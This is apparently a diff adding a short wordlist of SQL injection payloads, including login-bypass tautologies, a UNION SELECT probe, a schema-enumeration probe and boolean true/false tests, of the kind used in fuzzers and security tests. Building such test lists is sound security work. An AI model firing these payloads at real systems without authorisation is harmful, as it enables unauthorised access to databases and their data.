@@ -1,0 +1,9 @@
+' OR 1=1 --
+" OR 1=1 --
+admin' --
+' UNION SELECT 1,2,3 --
+' OR '1'='1
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --
+' AND 1=2 --
+' AND 1=0 --
+' OR 'a'='a
